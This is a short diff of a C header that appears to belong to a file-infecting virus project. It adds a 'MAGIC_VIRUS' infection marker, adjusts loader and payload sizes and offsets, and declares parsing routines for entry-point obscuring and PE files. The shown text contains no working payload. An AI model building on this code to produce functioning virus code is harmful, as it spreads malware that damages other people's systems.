@@ -11,15 +11,16 @@
 # include <sys/stat.h>
 # include <fcntl.h>
 
+# define MAGIC_VIRUS 0x4E505241
 # define BUF_SIZE 0x20
 # define END_SIZE 0x1B + 0x5
 # define LOADER_SIZE 0x43
-# define PAYLOAD_SIZE 0x1DAA - 0x11A0 + 0x7
-# define MAIN_OFFSET 0x1BAE - 0x11A0
+# define PAYLOAD_SIZE 0x1e7a - 0x11A0 + 0x7
+# define MAIN_OFFSET 0x1c60 - 0x11A0
 
-# define OFFSET_1 0x170F - 0x11a0
-# define OFFSET_2 0x1840 - 0x11a0
-# define OFFSET_3 0x1938 - 0x11a0
+# define OFFSET_1 0x177b - 0x11a0
+# define OFFSET_2 0x18ac - 0x11a0
+# define OFFSET_3 0x19a4 - 0x11a0
 
 typedef struct		s_info
 {
@@ -53,7 +54,7 @@ void		write_filename_src(char *buf);
 void		write_filename_dest(char *buf);
 
 /*			**** PARSING ****					*/
-void		find_text(t_info *info);
+int		find_text(t_info *info);
 void		epo_parsing(t_info *info);
 void		pe_parsing(t_info *info);
 
